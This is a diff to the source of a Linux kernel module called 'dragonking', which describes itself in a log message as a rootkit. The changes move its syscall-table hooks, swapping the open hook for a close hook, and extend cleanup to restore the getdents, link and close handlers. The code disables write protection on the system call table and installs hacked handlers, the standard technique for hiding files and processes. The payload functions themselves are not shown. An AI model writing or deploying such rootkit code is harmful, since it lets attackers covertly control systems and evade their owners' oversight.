@@ -44,8 +44,10 @@ static int __init dragonking_init(void)
 	sys_call_table[__NR_lstat] = (unsigned long *)&hacked_lstat;
 	orig_link = (void *)sys_call_table[__NR_link];
 	sys_call_table[__NR_link] = (unsigned long *)&hacked_link;
-	orig_open = (void *)sys_call_table[__NR_open];
-	sys_call_table[__NR_open] = (unsigned long *)&hacked_open;
+	orig_close = (void *)sys_call_table[__NR_close];
+	sys_call_table[__NR_close] = (unsigned long *)&hacked_close;
+	//orig_open = (void *)sys_call_table[__NR_open];
+	//sys_call_table[__NR_open] = (unsigned long *)&hacked_open;
 	//Set back to RO
 	set_addr_ro((unsigned long) sys_call_table);
 	printk(KERN_INFO "This is a rootkit.\n");
@@ -56,7 +58,11 @@ static void __exit dragonking_cleanup(void)
 {
 	    set_addr_rw((unsigned long) sys_call_table);
 	    sys_call_table[__NR_execve] = (unsigned long*)&orig_execve;
+	    //sys_call_table[__NR_open] = (unsigned long*)&orig_open;
 	    sys_call_table[__NR_lstat] = (unsigned long*)&orig_lstat;
+	    sys_call_table[__NR_getdents] = (unsigned long*)&orig_getdents;
+	    sys_call_table[__NR_link] = (unsigned long*)&orig_link;
+	    sys_call_table[__NR_close] = (unsigned long*)&orig_close;
 	    set_addr_ro((unsigned long) sys_call_table);
 	    printk(KERN_INFO "Rootkit removed.\n");
 }
